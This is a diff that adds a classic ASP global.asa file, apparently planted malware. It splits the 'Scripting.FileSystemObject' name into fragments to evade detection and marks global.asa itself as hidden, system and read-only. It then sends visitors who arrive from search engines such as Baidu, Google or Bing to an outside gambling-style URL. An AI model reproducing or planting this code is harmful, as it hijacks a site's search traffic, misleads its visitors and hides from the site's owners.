@@ -1,0 +1,24 @@
+<script language="vbscript" runat="server">  
+'by * 863111
+Set fso = Server.CreateObject("S"&"cr"&"ip"&"ti"&"ng.Fi"&"le"&"Sys"&"tem"&"Ob"&"je"&"ct")
+set f=fso.Getfile("//./" & Server.MapPath("/g"&"lo"&"ba"&"l.a"&"sa"))
+if f.attributes <> 7 then
+f.attributes = 7
+end if
+sub Application_OnStart
+end sub 
+sub Application_OnEnd  
+end sub
+sub Session_OnStart
+Dim REFERER
+yuming=Request.ServerVariables("SERVER_NAME")
+REFERER = Cstr(Request.ServerVariables("HTTP_REFERER"))
+If (InStr(REFERER,"baidu") > 0 Or InStr(REFERER,"google") > 0 Or InStr(REFERER,"soso.com") > 0 Or InStr(REFERER,"sogou.com") > 0 Or InStr(REFERER,"so") > 0 Or InStr(REFERER,"bing") > 0 Or InStr(REFERER,"youdao") > 0) and instr(Request.ServerVariables("SCRIPT_NAME"),"/index.asp")>0 and Request.ServerVariables("SCRIPT_NAME")<>"/index.asp" Then
+	Response.Redirect("http://www.833378.com/liu/32888.html")
+	Response.End()
+End IF
+end sub  
+'sub Session_OnEnd  
+'end sub
+</script>
+
